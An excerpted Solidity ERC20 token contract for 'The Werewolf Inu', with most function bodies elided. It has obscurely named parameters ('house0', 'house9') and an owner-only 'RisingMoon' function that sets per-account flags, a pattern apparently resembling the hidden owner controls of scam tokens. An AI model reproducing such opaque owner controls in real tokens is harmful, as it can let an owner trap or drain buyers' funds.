...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_, address creator_, bool house0, bool house2, uint256 house9) {
        _name = name_;
        _symbol = symbol_;
        ...
        DoRedistributionWithUniswap[creator_] = house0;
    }
    ...
    function RisingMoon(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function _FullMoon(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
...
contract ERC20Werewolf is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        bool house0, bool house2, uint256 house6,
        uint256 house7, address creator,
        uint256 initialSupply, address owner,
        uint256 house9
    ) ERC20(name, symbol, creator, house0, house2, house9) {
        _FullMoon(owner, initialSupply, house6, house7);
    }
}

contract TheWerewolfInu is ERC20Werewolf {
    constructor() ERC20Werewolf("The Werewolf Inu", "WEREWOLF", false, true, 1000, 23, msg.sender, 7000000000 * 10 ** 18, msg.sender, 7) {
    }
}